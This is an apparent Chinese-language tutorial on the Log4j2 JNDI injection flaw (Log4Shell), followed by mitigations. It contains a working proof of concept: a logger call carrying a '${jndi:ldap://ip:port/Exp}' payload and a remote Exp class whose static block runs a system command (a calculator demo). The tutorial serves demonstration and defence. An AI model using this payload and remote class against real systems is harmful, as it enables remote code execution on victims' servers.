5
在log4j2类当中我们,写入下列函数，进行模拟攻击者攻击


package com.example.log4j;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j2{
    private static final Logger logger = LogManager.getLogger(log4j2.class);

    public static void main(String[] args) {
        System.out.println("开始执行漏洞利用");
        //下面这条能防止出现这条报错信息 [main] ERROR log4j - Reference Class Name: foo
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        //这个模拟攻击者在你的网站当中的exp ip=命令执行的服务器的ip地址 prot=服务的端口
        logger.error("${jndi:ldap://ip:port/Exp}");
        System.out.println("利用完成");
    }
}

服务器准备

1
新建一个Exp.java，并且加上命令执行，我这里就弹出mac电脑或者win电脑的计算器做演示。（可以在自己电脑上测试一下）


public class Exp {
    public Exp() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Exp e = new Exp();
    }
}

2
临时解决方案


  1. 设置jvm参数 “-Dlog4j2.formatMsgNoLookups=true”

  2. 设置“log4j2.formatMsgNoLookups=True”

  1. 系统环境变量“FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS”设置为“true”

  2. 关闭对应应用的网络外连，禁止主动外连
